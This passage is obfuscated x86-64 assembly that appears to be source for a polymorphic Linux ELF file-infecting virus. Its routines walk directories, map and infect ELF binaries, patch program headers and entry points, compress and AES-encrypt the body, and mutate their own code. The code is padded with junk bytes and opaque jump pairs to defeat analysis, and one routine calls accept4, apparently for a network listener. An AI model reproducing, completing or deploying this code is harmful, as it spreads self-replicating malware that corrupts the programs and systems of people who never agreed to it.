    mov         BYTE [r1], 0x00
    jmp         ..@3gpXZVcgXUln
..@EPc57TdIKVj1:
    xchg        rdi, rdi
    cmp         rax, 0x01
    je          ..@cHUe3JCPyWyu
    jmp         $+3
db 0xbe
    jmp         $+5
db 0xb9, 0xb9, 0x27
    jmp         ..@DhU2vxHskT4J
..@pUvtQQdhC4gS:
    jl          ..@po2lz8fa5reh
    jmp         $+3
db 0x59
    jmp         $+5
db 0xad, 0x63, 0xb4
    jmp         $+5
db 0x6b, 0xd6, 0x7e
    jl          ..@qWx3NztNajIy
    jge         ..@qWx3NztNajIy
..@NzwpTP4F5lEy:
    mov         rsi, r5
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    xor         rcx, rcx
    mov         rax, QWORD [rsp+_UPDATASIG_OFF.meta_ptr]
    test        rax, rax
    jmp         ..@cuH9xsL3veqa
..@lrG19fhsf4mm:
    rep         nop
    jb          ..@37fbOdTdTkV1
    jae         ..@37fbOdTdTkV1
..@KU9KGzU7wEVE:
    mov         WORD [rdi], 9090h
    js          ..@LctNMD7hPavS
    jns         ..@LctNMD7hPavS
..@AOHWQ7SXFXWl:
    ret
    jmp         $+4
db 0xe0, 0x5b
    jmp         $+3
db 0x2d
    jl          ConvertAddToSub
    jge         ConvertAddToSub
..@R8PpF6y3g2wE:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
    pop         rdi
%endif
    js          ..@7pooBR20Hroq
    jns         ..@7pooBR20Hroq
..@ADVDwhBYcQhX:
    mov         ecx, signature_len
    js          ..@NBLCwSS6dvKZ
    jns         ..@NBLCwSS6dvKZ
..@DzNOyyuqkRlF:
    add         rax, bytes
    js          ..@ePWqDqKzsMfT
    jns         ..@ePWqDqKzsMfT
..@kQpPcyLifyvX:
    call        CreatePayload
    jmp         $+4
db 0xf2, 0xb9
    jmp         ..@P7KsLtnkWAdK
..@uEfEuZy6tVyg:
    mov         rsi, QWORD [rsp+_MUTA_OFF.start]
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    mov         rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jmp         $+4
db 0x3b, 0xed
    jmp         $+4
db 0x75, 0x45
    js          ..@RTr3tehnrNzl
    jns         ..@RTr3tehnrNzl
IsELFComplete:
    jmp         ..@SP6mxUlt3yVP
NonBinaryFile:
    jmp         ..@C7ERrVvpl4ZT
..@a26FgZaQK3Pa:
    pop         rsi
    jmp         $+3
db 0x75
    jmp         $+5
db 0x95, 0xde, 0x66
    jmp         ..@0DrRbUHYVyZO
..@gbnOo6agnS5M:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    js          ..@eRAluMOT1Lfs
    jns         ..@eRAluMOT1Lfs
..@5R2RslaXohZz:
    cmp         al, 0xa
    xchg        rdx, rdx
    xchg        rdx, rdx
    xchg        rcx, rcx
    jl          ..@2QSjaDhfeh7U
    jmp         $+3
db 0x91
    jmp         $+3
db 0x8d
    js          ..@dVnxaz7lAJVX
    jns         ..@dVnxaz7lAJVX
..@ez7h1zSEhStk:
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    mov         rdi, rdi
    mov         rdi, QWORD [rsp+_MUTA_OFF.start]
    add         rdi, rcx
    jmp         $+3
db 0x33
    jmp         ..@PUq3iWBE8zNV
..@IEnitZlsPgmD:
    xor         r2, r2
    xchg        rcx, rcx
    xor         r3, r3
    jmp         $+5
db 0x45, 0x01, 0x3f
    jmp         $+3
db 0xac
    js          ..@agMifGHxCrgS
    jns         ..@agMifGHxCrgS
..@Vf1C2TR3Mhtk:
    mov         BYTE [rsp+_MUTA_OFF.random_BYTE], dl
    jmp         $+3
db 0x01
    jb          ..@CMXtnQpIF3Ly
    jae         ..@CMXtnQpIF3Ly
..@ujryU8GdDTvw:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mul         r3 
    mov         rsi, rsi
    xchg        rdx, rdx
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    jl          ..@SjQS3Z9RLyHl
    jge         ..@SjQS3Z9RLyHl
..@rQRqrc8emApy:
%ifdef X86_64
    shl         ecx, 16
    or          ebx, edx
%endif
    jmp         $+3
db 0x43
    jl          ..@ngrXHKaim4Px
    jge         ..@ngrXHKaim4Px
..@2212lY35degI:
    xchg        rcx, rcx
    jmp         ..@APsSGOzGSKPe
..@D8bkKdwG0sq0:
%ifdef X86_64
    jne         ..@7871YsfeDySB
%endif
    jl          ..@FDikj69FyScC
    jge         ..@FDikj69FyScC
..@TdqnTQta8XGb:
    mov         al, BYTE [rdi]
    jl          ..@k32bBGPBUv3f
    jge         ..@k32bBGPBUv3f
..@ttjYNkhJQiQh:
    mov         rbp, rbp
    jmp         ..@ca5zcOOQPYjo
..@gkudJwVfgeAm:
    cmp         dl, 101000b
    jmp         $+3
db 0x7f
    js          ..@I9rjJzmRvRZ5
    jns         ..@I9rjJzmRvRZ5
MutationEngine:
    jmp         ..@7CPt1pu96CE7
..@Z2ZBLj0JIRMi:
%ifdef X86_64
    mov         rax, rsi
    and         rax, 100b
    xchg        rcx, rcx
    test        al, al
    xchg        rdx, rdx
%endif
    js          ..@qXAwNhZTiBD8
    jns         ..@qXAwNhZTiBD8
..@YQuYcLbe2QOw:
    push        rdx
    jmp         ..@zf34d2qF09sq
..@gHvVvItWZLAa:
    call        MapFile
    push        rbx
    pop         rbx
    cmp         rax, 0
    jne         ..@yzPYtCSt7DTx
    jmp         $+5
db 0xdb, 0xa2, 0x0c
    jmp         $+3
db 0x22
    jl          ..@cMxbqvTQda77
    jge         ..@cMxbqvTQda77
..@WflLTpF8ko81:
%ifdef X86_32
    mov         WORD [esi+ecx], bx
%endif
    js          ..@nOVjYeFH8fhC
    jns         ..@nOVjYeFH8fhC
..@khZTtQM168FB:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jb          ..@IEK5StFUfQkZ
    jae         ..@IEK5StFUfQkZ
..@KcpbLpWlDyrk:
    je          ..@cK1tRlOjOBLh
    jmp         $+5
db 0x22, 0x26, 0x83
    jmp         ..@i6yWxhZdO3Pu
..@wAadv0R7znTx:
    mov         rbp, rbp
    VAR         packed, dirs_root
    jmp         ..@0cuwo91qh6ib
    jmp         ..@2Z4swjLqutRn
..@8yfbo8TzUkTt:
    push        rsi
    jmp         ..@rvQ5Qvoq5CUB
..@RXsEaJL0ETMH:
    mov         edx, ebx
    and         ebx, 00000111b
    and         edx, 00111000b
    shr         edx, 3
    jb          ..@5mMwLhFb9YM3
    jae         ..@5mMwLhFb9YM3
..@KbAiB4IoDMzW:
    mov         r3, r2
    mov         r2, QWORD [r5+file.filesize]
    mov         r4, 0x1
    xor         rax, rax
    jmp         $+3
db 0x7d
    jmp         $+5
db 0x67, 0x59, 0xa4
    jl          ..@p5D0BgpKpiKj
    jge         ..@p5D0BgpKpiKj
..@gWIIAyaINQib:
    cmp         BYTE [r2], 0x0
    jmp         $+3
db 0xc3
    js          ..@phpH0Cu7htZ8
    jns         ..@phpH0Cu7htZ8
..@QcCcZJPVmt4B:
    sub         r4, m6
    push        rbx
    jmp         $+3
db 0xa0
    jmp         $+5
db 0x84, 0xcc, 0x7b
    jmp         ..@JA1oXhcp9Dbk
..@AkRre0xxhWlV:
    add         r2, 1
    jmp         $+5
db 0x2f, 0x4b, 0xc9
    js          ..@Zm085nnK9luv
    jns         ..@Zm085nnK9luv
..@jil0xsqJpn8I:
    jnz         ..@ADVDwhBYcQhX
    mov         ecx, signature_reg_len
    jmp         ..@NBLCwSS6dvKZ
    jmp         $+3
db 0xa6
    jmp         $+5
db 0xe4, 0xfb, 0x94
    jl          ..@ADVDwhBYcQhX
    jge         ..@ADVDwhBYcQhX
..@ig8GuIxx4T5Y:
    add         r1, 1
    jmp         ..@Z0ego14yyqCT
..@jijA7e8z0IqR:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         $+5
db 0x86, 0x8c, 0xe8
    jmp         $+3
db 0x29
    jmp         ..@8H4eURhtDdv5
..@inhzeTnUo50S:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         $+4
db 0x9a, 0xdb
    jl          ..@V9Y3jQoMHcf9
    jge         ..@V9Y3jQoMHcf9
..@7kykCKsLwlgY:
    mov         rcx, m7
    sub         rcx, m6
    mov         eax, 0x00
    rep         stosb
    xor         rax, rax
    jmp         $+3
db 0xae
    jmp         ..@tlPZ0p0R5qc5
..@mMHq8oFNB1Ce:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jne         ..@kevalbgCh927
    jl          ..@QiioP3qin7QY
    jge         ..@QiioP3qin7QY
..@iPCDMwT22hA5:
    xor         rbx, rbx
    je          ..@LJqIP4eZuDp7
    jne         ..@LJqIP4eZuDp7
..@Z8cMVypwe6Rh:
%ifdef X86_32
    mov         ecx, r3
%endif
    jl          ..@vUmEtPCVUEOf
    jge         ..@vUmEtPCVUEOf
..@4vmCv80yWkBf:
    sub         ebx, 1
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jge         ..@3Gjz4PKGxHa5
    jmp         ..@3HJ6hmgjhQvd
..@BDJItaPWcKey:
    push        rbx
    push        rdi
    pop         rdi
    jmp         $+4
db 0x75, 0x1f
    jb          ..@AVuqzdHfi0kK
    jae         ..@AVuqzdHfi0kK
..@6If4PKwPL4sw:
    mov         rdi, rdi
    jb          ..@7871YsfeDySB
    jae         ..@7871YsfeDySB
..@18cLRXFrUJ3B:
%ifdef X86_64
    mov         DWORD [rsi+rcx], ebx
%endif
    jmp         $+5
db 0xe8, 0x53, 0x52
    jmp         ..@iz2dEDA29b6v
..@dzGW3DbSXEiv:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    xor         r4, r4
    xor         r5, r5
    syscall
    xor         rax, rax
%endif
    je          ..@CVnUhVrj8Ya3
    jne         ..@CVnUhVrj8Ya3
..@LCVrLHKyODmi:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    movzx       rax, BYTE [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_reclen+r4]
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jmp         $+4
db 0x16, 0xcb
    jl          ..@ImlEG4UbHxSa
    jge         ..@ImlEG4UbHxSa
..@LUg8jmgtgjtT:
    mov         rbp, [rbp]
    jb          ..@ex0TXX8rfCV0
    jae         ..@ex0TXX8rfCV0
..@Q3Wm1M6C5X1j:
    ret
    jmp         _eof
..@CUiPpAfpt7Dv:
    push        rcx
    jmp         ..@jCkZGp1SJjq6
..@XhyNaOgVTvf7:
    xchg        rax, rax
    rep         nop
    push        rdx
    je          ..@72u5FtRpnozE
    jne         ..@72u5FtRpnozE
..@2TEZnZojdEHl:
    xor         rax, rax
    jmp         $+5
db 0xde, 0xa2, 0x3c
    jmp         ..@YpFr0KE2lQZZ
GetNewProgramVaddr:
    jmp         ..@3Q2mv8BTGULc
..@2IyxhvNG01nV:
    cmp         dx, 800fh
    jl          ..@C5kUwVEU2zUg
    jge         ..@C5kUwVEU2zUg
..@e7se5EjvstVK:
    mov         rdi, m6
    js          ..@CBPHKBGlYIvo
    jns         ..@CBPHKBGlYIvo
..@EPUUdpf4LBsZ:
    xchg        rsi, rsi
    jb          ..@ZKbC9wn0PQQY
    jae         ..@ZKbC9wn0PQQY
..@jf0tcdVo7mKD:
    mov         BYTE [rdi], 0e9h
    push        rdi
    pop         rdi
    mov         DWORD [rdi+1], ecx
    jmp         ..@D4LyWb8Abb9v
..@018Tc4GBuPng:
%ifdef X86_32
    mov         BYTE [esi+ecx], 90h
%endif
    jmp         $+5
db 0x67, 0xd6, 0xb6
    jmp         ..@8NJoxchybD76
..@4W1jwsTLKIP3:
    pop         rbx
    js          ..@oYHuWcQ3sZEc
    jns         ..@oYHuWcQ3sZEc
..@3ZMdEDKQGI8C:
%ifdef X86_64
    mov         rdx, rdx
%endif
    jmp         $+5
db 0x7f, 0xac, 0x1b
    jl          ..@5969UREY6DIV
    jge         ..@5969UREY6DIV
..@OnPszk2KSbjX:
    test        ecx, ecx
    js          ..@p5RtKuud3ylK
    jns         ..@p5RtKuud3ylK
..@4u4KBgm0SXvV:
    add         rdi, rcx
    jmp         $+5
db 0xfb, 0xa5, 0xe5
    jmp         ..@IjtgEvdd9E5e
..@rEFMNmxZsRrk:
    xchg        rsi, rsi
    jmp         $+3
db 0x8b
    jl          ..@qQ5wZbRc5imi
    jge         ..@qQ5wZbRc5imi
..@lWXajzue5MgZ:
%ifdef X86_32
    cmp         dx, 00e881h
    je          ..@gdxWmThcBjhG
    cmp         dx, 00c080h
    mov         rcx, rcx
    je          ..@gdxWmThcBjhG
%endif
    jmp         $+5
db 0x39, 0x26, 0x14
    js          ..@WMRbMlGuFNOP
    jns         ..@WMRbMlGuFNOP
..@aW9UCMBkNJrZ:
%ifdef X86_32
    je          ..@gdxWmThcBjhG
%endif
    jb          ..@lWXajzue5MgZ
    jae         ..@lWXajzue5MgZ
..@C5kUwVEU2zUg:
    je          ..@NUUNUHrgLb9F
    js          ..@1Bba7IWAZU7G
    jns         ..@1Bba7IWAZU7G
..@vM9NJNVIRxzJ:
    mov         r3, rax
    jb          ..@0c1xKvYi6An3
    jae         ..@0c1xKvYi6An3
..@43rnOixT1GyQ:
    mov         r2, m6
    jb          ..@EXfWyXq0QUpR
    jae         ..@EXfWyXq0QUpR
..@bYYaKTkE26mv:
    pop         r5
    je          ..@b3iAI5BtdhRv
    jne         ..@b3iAI5BtdhRv
Aes256Encryption:
    jmp         ..@4oOgnurVssu3
..@CnhmDOpINvdd:
    push        rbx
    jmp         $+3
db 0x21
    jl          ..@Ny4ZIbltlOIi
    jge         ..@Ny4ZIbltlOIi
..@NF1tN0tRoH5a:
    xchg        rsp, rsp
    sub         rsp, _AESE_OFF_size+0x100
    and         rsp, 0xfffffffffffffff0
    push        rdx
    js          ..@Cw32mx3ZpcZh
    jns         ..@Cw32mx3ZpcZh
..@HE6RR0FETMUb:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+3
db 0x30
    jmp         ..@PZYS1PQiiHrf
..@l2wC8nseJgoU:
    jmp         ..@z3vX8JB2aUDY
    je          ..@VV5pZp7IZbe7
    jne         ..@VV5pZp7IZbe7
..@G330U5Ia3k8D:
    mov         r2, 11b
    call        MapFile
    cmp         rax, 0
    jmp         $+3
db 0xc8
    jmp         $+4
db 0x4e, 0x46
    js          ..@rZZLb0w41ora
    jns         ..@rZZLb0w41ora
..@7NepqYUtqLjG:
%ifdef X86_64
    push        rdi
%endif
    jmp         $+4
db 0x9d, 0x90
    jb          ..@57stFcCjgyrT
    jae         ..@57stFcCjgyrT
..@zTHBLrtuCaAL:
    xor         rcx, rcx
    jmp         ..@X2vPPF2naCLn
..@jCkZGp1SJjq6:
    pop         rcx
    and         al, 111b
    jmp         ..@tTwla7e81SAJ
..@0Q6ql4W7tmqs:
    rep         nop
    jmp         $+5
db 0x49, 0xfa, 0xff
    jmp         $+5
db 0xec, 0x70, 0xe2
    jmp         $+4
db 0x75, 0x57
    jmp         ..@V6ksBivHN48R
..@41mnJvSAcpmx:
    or          bx, dx
    jb          ..@NlmB8yq5urM3
    jae         ..@NlmB8yq5urM3
..@LDENVXgn6rTI:
    push        rdx
    jmp         $+5
db 0x1b, 0x8d, 0xb7
    jmp         $+4
db 0x5c, 0x1c
    js          ..@tl6464av7muG
    jns         ..@tl6464av7muG
..@tbCAZdU4Maz7:
    pop         rsi
    js          ..@LfxKAOkRNqFy
    jns         ..@LfxKAOkRNqFy
..@K5dahWlbKrYZ:
    mov         eax, 1
    je          ..@2212lY35degI
    jne         ..@2212lY35degI
..@8OPpJKfPsm72:
    add         rdi, 4
    jmp         ..@KO3rgVaKK4H9
..@d94BKV8hB7Vr:
    push        rsi
    pop         rsi
    syscall
    jmp         $+3
db 0x58
    jmp         $+3
db 0x05
    jl          ..@B8s0wfsX2IJJ
    jge         ..@B8s0wfsX2IJJ
..@wCQttqLsMufC:
    mov         rdi, rsi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    jmp         $+4
db 0xa2, 0x25
    jmp         ..@5gufWCQswaan
..@ePWqDqKzsMfT:
    push        rax
    jmp         $+4
db 0xcd, 0x36
    jmp         $+4
db 0xa6, 0xa2
    jl          ..@wAadv0R7znTx
    jge         ..@wAadv0R7znTx
..@fv1jVEZioyhF:
    mov         rsi, rsi
    add         rsp, _LZSSE_OFF_size
    ret
    jmp         $+3
db 0xb3
    jmp         $+4
db 0xf0, 0xaa
    js          UpdateSignature
    jns         UpdateSignature
..@cSFWXWmVimkw:
    pop         rcx
    pop         rsi
    jmp         $+5
db 0xe3, 0x71, 0x40
    jmp         $+3
db 0x31
    jmp         ..@b8AEWJ69lMdJ
..@d1e5PHsp73XJ:
    xor         r2, r2
    xor         r3, r3
    jmp         ..@lig6j0Kd1iuy
..@UDS8KtqDLaRE:
    add         rdi, rcx
    add         rsi, rcx
    sub         rdi, 1
    js          ..@FgaGDyohCEqU
    jns         ..@FgaGDyohCEqU
..@Y4HZlRe5kTN7:
    mov         rdx, rsi
    jl          ..@V0hNBUUpMlI3
    jge         ..@V0hNBUUpMlI3
..@RYCnsRrYvdgH:
    push        rdx
    jmp         $+5
db 0x97, 0x0f, 0xbd
    je          ..@Th1aVdI4KJP2
    jne         ..@Th1aVdI4KJP2
..@W0luSWuw8pZr:
    pop         rdx
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.key_preview-_signature.start
    mov         DWORD [rdi], eax
    mov         rax, QWORD [rsp+_UPDATASIG_OFF.meta_ptr]
    js          ..@qLDQHkSh3Z6G
    jns         ..@qLDQHkSh3Z6G
..@MrHlzjFuP7z5:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@kevalbgCh927
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jne         ..@fFE2HLRNQNCH
    jl          ..@8f9r31zUkniY
    jge         ..@8f9r31zUkniY
..@jHqkrpUhFBz2:
    mov         QWORD [r5+file.fileptr], 0x00
    jmp         $+4
db 0x41, 0x06
    jl          ..@Q9kgQci0rOTe
    jge         ..@Q9kgQci0rOTe
..@Z0ego14yyqCT:
    jmp         ..@jH6lhwQ8cKWQ
    jmp         $+3
db 0x1e
    jmp         $+5
db 0xdf, 0x54, 0xa6
    jmp         $+4
db 0x79, 0x63
    jmp         ..@zzBFybVeIetA
..@oXXAFIvuGtbZ:
    jnz         ..@GRXiEW7aiBex
    push        rax
    js          ..@fACBqkaLPHs1
    jns         ..@fACBqkaLPHs1
..@n8bRDgeOgnvg:
    xor         rax, rax
    jmp         $+3
db 0x5e
    jmp         $+5
db 0x93, 0xc8, 0x90
    je          ..@yH8miNbVVAxg
    jne         ..@yH8miNbVVAxg
..@11VAWvBZx8hu:
%ifdef X86_64
    mov         WORD [rsi+rcx], 9090h
%endif
    jmp         $+5
db 0x6e, 0x68, 0x59
    jmp         ..@018Tc4GBuPng
..@nOVjYeFH8fhC:
    xchg        rsi, rsi
    pop         rcx
    jmp         $+4
db 0xed, 0x61
    jmp         ..@16CR4Uga9Suc
..@Fqo39XHFe88t:
%ifdef X86_64
    shr         rdx, 8
%endif
    jb          ..@kIbOGQp3Nuyr
    jae         ..@kIbOGQp3Nuyr
..@ThquYiAGOjhH:
    add         r2, e_h.e_shoff
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         ..@93GEBVNRhhW9
..@6hzjPsn3bhjT:
%ifdef X86_64
    cmp         edx, 00c08148h
    je          ..@gdxWmThcBjhG
    cmp         edx, 00e88148h
%endif
    jmp         $+5
db 0xe3, 0x75, 0x39
    jmp         $+4
db 0xd2, 0x36
    jmp         ..@3ZMdEDKQGI8C
..@FTHUeGV4NFio:
    ret
    jmp         $+5
db 0x68, 0x5a, 0x45
    js          WORDToDWORDASCII
    jns         WORDToDWORDASCII
..@E0erwFFMNird:
    xor         r2, r2
    xor         r3, r3
    VAR         packed, urandom
    je          ..@pHSIx1A7ZiBO
    jne         ..@pHSIx1A7ZiBO
..@gdNmfhyGSQvz:
%ifdef X86_64
    and         bx, 111b
%endif
    jmp         ..@HLsKnX55ZEpX
..@5TCDmJ7YeCzG:
%ifndef ENABLE_DEBUGGING
    syscall
    mov         rsp, rsp
    push        rdi
    pop         rdi
%endif
    jl          ..@BOyeyMnhcHWQ
    jge         ..@BOyeyMnhcHWQ
..@C8WKuOaK89YX:
    mov         QWORD [r5+file.filesize], r3
    jmp         $+3
db 0x49
    jmp         $+4
db 0x76, 0x35
    jmp         ..@5UG9fPjMA3Ak
..@vV2y23mKYURm:
    xchg        rsp, rsp
    mov         rsi, rsi
    mov         rax, rax
    js          ..@WGAqZVQvGhVO
    jns         ..@WGAqZVQvGhVO
..@tmri0f6B3kcF:
    pop         rdx
    jmp         $+4
db 0x1f, 0xce
    jb          ..@Y6wPGi54f1Hm
    jae         ..@Y6wPGi54f1Hm
..@htDn977aXKPk:
    test        cl, cl
    jmp         $+5
db 0xd2, 0xae, 0x09
    jmp         ..@X32ONBa52lsA
..@1VNbiDT3J6gh:
    cmp         r3, 0x00
    je          ..@PP1Bp0OhnPMV
    jne         ..@PP1Bp0OhnPMV
..@YgxEr2JNaDPz:
    cmp         eax, 0x03
    jl          ..@73vNfyYZLPTo
    jmp         $+3
db 0x05
    jl          ..@gbnOo6agnS5M
    jge         ..@gbnOo6agnS5M
..@RfSKIafCnyPr:
    call_vsp    Aes256KeyCreation
    jmp         $+4
db 0x34, 0xa0
    jmp         ..@7NG216VwEMPs
..@jC70PiACmW9r:
    xchg        rdx, rdx
    jmp         $+3
db 0x70
    jmp         $+3
db 0xdd
    je          ..@sWTrAi3ttAsI
    jne         ..@sWTrAi3ttAsI
..@7hd0cIVRgsA9:
%ifdef X86_64
    rep         nop
    mov         BYTE [rdi], 41h
    add         rdi, 1
    xchg        rsi, rsi
    push        rcx
%endif
    js          ..@s10BjrP89aFM
    jns         ..@s10BjrP89aFM
..@hFeP9gDYGW50:
    cmp         r2d, '../'
    jmp         $+4
db 0xd6, 0xdc
    jmp         $+3
db 0xc4
    jmp         ..@GUS2W0jvGXzF
..@7YvQtUXrQZVX:
    mov         dl, 0fh
    mov         WORD [rdi], dx
    mov         DWORD [rdi+2], ecx
    or          dx, 100000000b
    jmp         $+4
db 0x21, 0x2c
    je          ..@EtHK6LAzEomK
    jne         ..@EtHK6LAzEomK
..@43SMy5O6uhWr:
    jmp         ..@YtnYaSniTSrM
    jmp         $+3
db 0xcf
    jmp         $+4
db 0xd4, 0x4c
    jmp         ..@fRaLxmkHANUS
..@8NJoxchybD76:
    pop         rcx
    pop         rsi
    xor         rax, rax
    ret
    js          ..@6If4PKwPL4sw
    jns         ..@6If4PKwPL4sw
..@o9Ll7MF2FcBJ:
    pop         rdi
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x50]
    aesenc      xmm0, xmm1
    mov         rsp, rsp
    jmp         $+5
db 0xb1, 0xaf, 0x62
    jb          ..@2Rn1Ls7uDNIK
    jae         ..@2Rn1Ls7uDNIK
..@aNR7w3En9Vqe:
    shr         edx, 8
    jl          ..@z3vX8JB2aUDY
    jge         ..@z3vX8JB2aUDY
..@jCeZZgDbMoVq:
    mov         rbx, 0x1000
    sub         rbx, r3
    add         rax, rbx
    add         rsp, _VADDR_OFF_size
    pop         r1
    jmp         $+3
db 0x0d
    jl          ..@eTurRFYEFRzF
    jge         ..@eTurRFYEFRzF
..@muZ0ujcMLDdg:
    xchg        rcx, rcx
    mov         rbp, rsp
    jb          ..@NF1tN0tRoH5a
    jae         ..@NF1tN0tRoH5a
..@tASYEaOehKqL:
    jl          ..@5e941Z6tOgQO
    je          ..@5lsYFr9KqSUL
    jne         ..@5lsYFr9KqSUL
..@1Yt8ZOPK46Rl:
    mov         QWORD [r5+file.filesize], rax
    jmp         ..@6lO7RH6fXQWX
..@OgYrJ0IkcSMB:
    mov         QWORD [r2+p_h.p_vaddr], r3
    mov         rbx, rbx
    mov         QWORD [r2+p_h.p_paddr], r3
    jmp         $+3
db 0x80
    jl          ..@mjeWbihsrggM
    jge         ..@mjeWbihsrggM
..@wolbXgGjHzJj:
    mov         rdx, rdx
    js          ..@GXCcmDrNkilX
    jns         ..@GXCcmDrNkilX
..@NT6TkKIglTKq:
    pop         r1
    jmp         $+4
db 0x19, 0x49
    jmp         ..@tW3Ohbs44yXm
..@Ne9zvfOSym1T:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    xchg        rdx, rdx
    mov         eax, SYS_ACCEPT4
    syscall
    cmp         rax, 0x0
%endif
    jmp         $+4
db 0xae, 0x5e
    js          ..@Aj6xbsZmnhcr
    jns         ..@Aj6xbsZmnhcr
..@F1Lzydudq6g7:
    pop         rsi
    jmp         ..@R7TqSd7NACL6
..@DccI5U6o5yFM:
%ifdef X86_64
    mov         rdi, rdi
%endif
    js          ..@4NvJF1YSd8ig
    jns         ..@4NvJF1YSd8ig
..@LfxKAOkRNqFy:
    mov         rsp, rsp
    xor         rax, rax
    xor         rdi, rdi
    xor         rcx, rcx
    xchg        rdi, rdi
    jl          ..@iBC4lB95o5Pw
    jge         ..@iBC4lB95o5Pw
..@rNPiV1ttLhtD:
%ifdef X86_64
    xchg        rdi, rdi
%endif
    jmp         $+4
db 0x8d, 0x85
    jmp         ..@7hd0cIVRgsA9
..@jYdTDwn1FCav:
    jne         ..@f9apXuvSh8aq
    je          ..@bqGEenKTzjI8
    jne         ..@bqGEenKTzjI8
..@l0mkoaPv7t85:
%ifdef X86_32
    mov         rdi, rdi
%endif
    jmp         $+4
db 0x0c, 0x94
    jmp         $+3
db 0xd6
    jmp         $+5
db 0x92, 0xed, 0xb3
    jmp         $+3
db 0x41
    jmp         ..@1fpYkkP1SwR1
..@7h1n2c9MmMPs:
    shr         rax, 8
    jmp         $+3
db 0x52
    jb          ..@bEmgdVVZGUhP
    jae         ..@bEmgdVVZGUhP
..@M4cHhnBrLgV8:
    cmp         BYTE [r5], DT_REG
    jne         ..@LCVrLHKyODmi
    je          ..@lFrWsq1DubUZ
    jne         ..@lFrWsq1DubUZ
..@2jdNFQny8glW:
    sub         r2, 1
    jmp         $+4
db 0x2d, 0x54
    jmp         $+4
db 0x43, 0xcb
    js          ..@l3Yeg6dBRgaT
    jns         ..@l3Yeg6dBRgaT
..@FLnc8j2YZdrY:
%ifdef X86_64
    cmp         edx, 90585041h
    mov         rdx, rdx
    mov         rsp, rsp
    je          ..@3VbMPYOt5tFG
%endif
    jb          ..@X9CJcY2lLwx2
    jae         ..@X9CJcY2lLwx2
..@b8AEWJ69lMdJ:
    mov         rax, (-1)
    jb          ..@sQoaAWVSO6Me
    jae         ..@sQoaAWVSO6Me
..@of6Jhzl4bu2W:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jmp         $+5
db 0x69, 0x61, 0x8e
    jmp         ..@XOwVAyzIf3FF
..@fScEuhSHAxfe:
    pop         rdx
    xor         rcx, rcx
    mov         ecx, DWORD [rdi+2]
    add         ecx, 1
    jmp         ..@CWIX5RkAnUG9
..@BPdSCoUhtAof:
    jmp         ..@fRaLxmkHANUS
    jl          ..@pzyD6UmuIL0g
    jge         ..@pzyD6UmuIL0g
..@oL4Qd1RiUZOB:
%ifndef ENABLE_DEBUGGING
    jl          ..@gvR834lDN6hJ
%endif
    jmp         $+4
db 0x15, 0x57
    jmp         $+4
db 0x17, 0xa1
    jmp         $+4
db 0x77, 0xa4
    jmp         $+5
db 0x13, 0x0d, 0x81
    jmp         $+3
db 0x44
    jmp         ..@lGUooJp11F0A
..@bJVfVjmiXldM:
    pop         rdx
    js          ..@ELw8CQHqp5XF
    jns         ..@ELw8CQHqp5XF
..@FHJ4zOjttsr9:
    jmp         ..@ftKh8pWOmzyf
    jl          ..@Axz8cAnkL80v
    jge         ..@Axz8cAnkL80v
..@5UG9fPjMA3Ak:
    jmp         ..@weKp4CZsaco9
    jmp         ..@rEFMNmxZsRrk
..@t01ODOQlK1MR:
    mov         BYTE [rdi], bl
    jmp         $+5
db 0xe4, 0xa2, 0x98
    js          ..@EY2WolpGhxxs
    jns         ..@EY2WolpGhxxs
..@4xRwye6teTPF:
    cmp         dl, 0fh
    xchg        rdi, rdi
    je          ..@ajQFF9KdToqq
    je          ..@iP0aQtdSq2Mo
    jne         ..@iP0aQtdSq2Mo
..@LyWMH9Dc5QWE:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    js          ..@3N4F1EGhyvBB
    jns         ..@3N4F1EGhyvBB
..@QiioP3qin7QY:
    xor         rcx, rcx
    jb          ..@jccSr2rdO8RW
    jae         ..@jccSr2rdO8RW
..@R0sdzrvxfGnM:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    mov         rbx, rbx
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    sub         al, 0x02
    jmp         $+4
db 0x95, 0xba
    js          ..@vgAjv3vRxbFi
    jns         ..@vgAjv3vRxbFi
..@vSWbRP6qVOgq:
    push        rax
    jmp         ..@ITaobB6qTfRS
..@sIzvrnTviVFt:
    mov         edx, DWORD [rdi]
    je          ..@C0reXm7nU0Si
    jne         ..@C0reXm7nU0Si
..@2bsuNfDECGct:
    mov         rdx, rdx
    js          ..@pUvtQQdhC4gS
    jns         ..@pUvtQQdhC4gS
..@5c9mMpqNNiTx:
%ifdef X86_32
    pop         rbx
    xor         eax, eax
%endif
    je          ..@6tHBzgu3PJ9q
    jne         ..@6tHBzgu3PJ9q
..@KL2hLTP2onaO:
    pop         rcx
    pop         rsi
    mov         rbx, rbx
